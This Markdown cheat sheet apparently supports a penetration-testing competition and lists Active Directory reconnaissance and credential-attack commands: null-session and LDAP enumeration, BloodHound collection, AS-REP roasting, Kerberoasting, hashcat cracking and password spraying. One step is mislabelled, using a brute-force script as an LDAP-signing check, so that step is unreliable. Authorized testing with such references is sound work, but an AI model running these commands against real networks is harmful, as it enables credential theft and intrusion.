# Windows/Active Directory Reconnaissance

## Initial Network Discovery

### Quick SMB/NetBIOS Scan
```bash
# NetExec - SMB discovery
netexec smb 10.10.10.0/24

# Check for SMB signing (relay attack potential)
netexec smb 10.10.10.0/24 --gen-relay-list relay_targets.txt

# Nmap SMB scripts
nmap -p445 --script smb-protocols,smb-security-mode,smb-os-discovery 10.10.10.0/24
```

### Check for Null Sessions / Guest Access
```bash
# Null session
netexec smb TARGET -u '' -p ''

# Guest account
netexec smb TARGET -u 'guest' -p ''

# Try on all discovered hosts
netexec smb 10.10.10.0/24 -u '' -p '' --shares
```

## Enumeration Without Credentials

### SMB Enumeration
```bash
# enum4linux-ng - comprehensive SMB enum
enum4linux-ng TARGET -A -C

# List shares
smbclient -L //TARGET -N

# Recursively list all accessible shares
smbmap -H TARGET -R

# Mount accessible shares
smbclient //TARGET/SHARE -N
```

### RPC Enumeration
```bash
# RPC client
rpcclient -U "" -N TARGET
# Once connected, useful commands:
# enumdomusers - list domain users
# enumdomgroups - list domain groups
# querydominfo - domain information

# Automated RPC enum
impacket-lookupsid anonymous@TARGET
```

## Enumeration With Low-Priv Credentials

**Once you have ANY domain credentials (even low-priv user):**

### User/Group Enumeration
```bash
# Get domain users
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --users > users.txt

# Get domain groups
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --groups > groups.txt

# Get domain admin users
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --groups "Domain Admins"

# Get all group memberships
netexec ldap DC_IP -u USERNAME -p 'PASSWORD' --users --groups

# LDAP enumeration
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN.LOCAL" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
```

### Share Enumeration
```bash
# List shares on all hosts
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --shares

# Spider shares looking for interesting files
netexec smb TARGET -u USERNAME -p 'PASSWORD' -M spider_plus

# Look for passwords in share names/descriptions
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --shares | grep -i "password\|backup\|admin"
```

### Password Policy Enumeration
```bash
# Get password policy
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --pass-pol

# Using ldapsearch
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=domain)" pwdProperties
```

## Kerberos Enumeration

### User Enumeration via Kerberos
```bash
# Kerbrute - enumerate valid users
kerbrute userenum --dc DC_IP -d DOMAIN.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Check if users have pre-auth disabled (AS-REP roastable)
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### SPN Enumeration
```bash
# List all SPNs (requires domain creds)
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP

# Save for Kerberoasting
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt
```

## BloodHound Collection

### Remote Collection (From Kali)
```bash
# Using bloodhound-python
bloodhound-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns DC_IP -c All --zip

# Targeted collection (faster)
bloodhound-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns DC_IP -c DCOnly,Session --zip
```

### Upload to BloodHound
```bash
# Start neo4j
sudo neo4j start

# Start BloodHound
bloodhound

# Upload the .zip files via GUI
# Then run pre-built queries:
# - Find all Domain Admins
# - Shortest path to Domain Admins
# - Find AS-REP Roastable users
# - Find Kerberoastable users
```

### Useful BloodHound Queries
```cypher
# Find users with SPNs
MATCH (u:User {hasspn:true}) RETURN u

# Find AS-REP roastable users
MATCH (u:User {dontrepreauth:true}) RETURN u

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

# Shortest path from owned user to Domain Admin
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

## Detailed Host Enumeration

### Enumerate Logged-On Users
```bash
# See who's logged in where
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --sessions

# Check specific high-value targets
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --sessions
```

### Check Local Admin Access
```bash
# Where can you authenticate as local admin?
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --local-auth

# Test specific user
netexec smb 10.10.10.0/24 -u ADMIN_USER -p 'PASSWORD'
```

## DNS Enumeration

### Zone Transfer Attempts
```bash
# Try zone transfer
dig axfr @DC_IP DOMAIN.LOCAL

# Using dnsrecon
dnsrecon -d DOMAIN.LOCAL -a -n DC_IP
```

### DNS Enumeration
```bash
# Enumerate DNS records
dnsenum --enum DOMAIN.LOCAL -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Check for DNS admin records
nslookup -type=any _ldap._tcp.dc._msdcs.DOMAIN.LOCAL DC_IP
```

## LDAP Enumeration

### Comprehensive LDAP Dump
```bash
# Dump all LDAP info
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" > ldap_dump.txt

# Extract all users
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | awk '{print $2}' > users.txt

# Find users with descriptions containing passwords
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=user)" description | grep -i "password"

# Find service accounts
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(servicePrincipalName=*)" sAMAccountName
```

## Quick Checks

### Check for Common Misconfigurations
```bash
# 1. SMB signing disabled? (relay attacks)
netexec smb DC_IP --gen-relay-list targets.txt
# If DC is in the list = critical finding

# 2. LDAP signing not required?
nmap -p 389 --script ldap-brute DC_IP

# 3. Anonymous LDAP bind allowed?
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# 4. MS17-010 (EternalBlue) - old but gold
nmap -p445 --script smb-vuln-ms17-010 10.10.10.0/24
```

## Competition Workflow

```bash
# 1. Check SMB signing (CRITICAL)
netexec smb DC_IP --gen-relay-list relay.txt

# 2. Start BloodHound collection (background)
bloodhound-python -u USERNAME -p 'PASSWORD' -d DOMAIN.LOCAL -ns DC_IP -c All --zip &

# 3. AS-REP Roasting (quick win)
impacket-GetNPUsers DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request

# 4. Kerberoasting (quick win)
impacket-GetUserSPNs DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request
```

```bash
# 5. Start cracking hashes (background)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt &
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt &

# 6. Enumerate shares
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' --shares

# 7. Check for admin access
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD'

# 8. Load BloodHound and run queries
```

## Password Spraying

### Before You Spray
```bash
# 1. Get password policy first!!!
netexec smb DC_IP -u USERNAME -p 'PASSWORD' --pass-pol

# Check lockout threshold and duration
# Dont spray if lockout is low 
```

### Safe Spraying
```bash
# Try one password across all users (safer than brute force)
netexec smb DC_IP -u users.txt -p 'Welcome2024!' --continue-on-success
```

## Useful One-Liners

### Create User List from LDAP
```bash
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d' ' -f2 | sort -u > users.txt
```

### Find Computers
```bash
ldapsearch -x -H ldap://DC_IP -D "USERNAME@DOMAIN" -w 'PASSWORD' -b "DC=domain,DC=local" "(objectClass=computer)" dNSHostName | grep dNSHostName | cut -d' ' -f2 | sort -u > computers.txt
```

### Check All Hosts for Admin Access
```bash
# Spray credentials across network
netexec smb 10.10.10.0/24 -u USERNAME -p 'PASSWORD' | grep -i "Pwn3d!"
```

## Document Everything!

**For GhostWriter, immediately document:**
- SMB signing status on DC
- AS-REP roastable users (with cracked passwords)
- Kerberoastable users (with cracked passwords)
- Shares with sensitive data
- Users with admin access to multiple systems
- Password policy weaknesses
- Any null session/anonymous access

**Remember:**
- Always check password policy before spraying
- Document misconfigurations immediately
- Low-priv domain user = keys to the kingdom (with enough enum)
